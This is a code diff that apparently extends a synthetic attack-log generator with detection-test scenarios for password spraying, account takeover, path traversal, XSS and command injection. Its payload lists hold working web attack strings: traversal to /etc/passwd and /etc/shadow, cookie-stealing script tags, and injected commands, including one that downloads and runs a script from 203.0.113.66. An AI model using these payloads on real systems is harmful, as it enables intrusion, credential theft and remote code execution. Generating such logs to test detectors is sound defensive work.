@@ -63,6 +63,40 @@ const ENUM_PATHS = [
   '/api/v1/internal',
 ] as const;
 
+const SPRAY_USERS = [
+  'admin',
+  'root',
+  'test',
+  'oracle',
+  'postgres',
+  'ubuntu',
+  'guest',
+  'jenkins',
+] as const;
+
+// payloads are written without raw spaces (%20 instead): the nginx combined
+// log format delimits the request line on spaces, like the real thing
+const TRAVERSAL_PATHS = [
+  '/download?file=../../../../etc/passwd',
+  '/static/..%2f..%2f..%2fetc/shadow',
+  '/api/files?path=%252e%252e%252f%252e%252e%252fwindows%252fwin.ini',
+  '/images/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts',
+] as const;
+
+const XSS_PATHS = [
+  '/search?q=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E',
+  '/profile?name=%3Cimg%20src=x%20onerror=alert(1)%3E',
+  '/redirect?url=javascript:alert(1)',
+  '/comment?body=%3Csvg%2Fonload%3Dalert(1)%3E',
+] as const;
+
+const CMD_INJECTION_PATHS = [
+  '/api/ping?host=127.0.0.1;cat%20/etc/passwd',
+  '/api/ping?host=8.8.8.8|id',
+  '/cgi-bin/status?cmd=%60whoami%60',
+  '/api/export?name=report$(curl%20http://203.0.113.66/x.sh|sh)',
+] as const;
+
 export const SCENARIOS: Record<string, Scenario> = {
   'brute-force': {
     name: 'brute-force',
@@ -80,6 +114,32 @@ export const SCENARIOS: Record<string, Scenario> = {
     },
   },
 
+  'password-spray': {
+    name: 'password-spray',
+    description:
+      'One failed login each across many accounts from one IP (trips password-spraying).',
+    generate: () => {
+      const ip = attackerIp();
+      const users = [...SPRAY_USERS].sort(() => Math.random() - 0.5).slice(0, 6);
+      return users.map((user) => authLog({ user, ip, outcome: 'failure' }));
+    },
+  },
+
+  'account-takeover': {
+    name: 'account-takeover',
+    description:
+      'Brute force against one account that ends in a successful login (trips login-after-brute-force).',
+    generate: () => {
+      const ip = attackerIp();
+      const user = pick(['admin', 'deploy', 'svc-backup']);
+      const logs = Array.from({ length: 6 + randInt(3) }, () =>
+        authLog({ user, ip, outcome: 'failure' }),
+      );
+      logs.push(authLog({ user, ip, outcome: 'success' }));
+      return logs;
+    },
+  },
+
   sqli: {
     name: 'sqli',
     description: 'SQL-injection probes against the API gateway (400/500s).',
@@ -92,6 +152,51 @@ export const SCENARIOS: Record<string, Scenario> = {
           path,
           status: pick([400, 403, 500]),
           userAgent: 'sqlmap/1.8',
+        }),
+      );
+    },
+  },
+
+  'path-traversal': {
+    name: 'path-traversal',
+    description: 'Attempts to climb out of the web root, plain and double/overlong-encoded.',
+    generate: () => {
+      const ip = attackerIp();
+      return TRAVERSAL_PATHS.map((path) =>
+        nginxLog({ ip, path, status: pick([400, 403, 404]), userAgent: 'curl/8.4.0' }),
+      );
+    },
+  },
+
+  xss: {
+    name: 'xss',
+    description: 'Reflected cross-site scripting probes against the API gateway.',
+    generate: () => {
+      const ip = attackerIp();
+      return XSS_PATHS.map((path) =>
+        apiGatewayLog({
+          ip,
+          method: 'GET',
+          path,
+          status: pick([200, 400]),
+          userAgent: 'Mozilla/5.0',
+        }),
+      );
+    },
+  },
+
+  'command-injection': {
+    name: 'command-injection',
+    description: 'Shell metacharacter payloads aimed at a "ping this host" style endpoint.',
+    generate: () => {
+      const ip = attackerIp();
+      return CMD_INJECTION_PATHS.map((path) =>
+        apiGatewayLog({
+          ip,
+          method: 'GET',
+          path,
+          status: pick([400, 500]),
+          userAgent: 'curl/8.4.0',
         }),
       );
     },
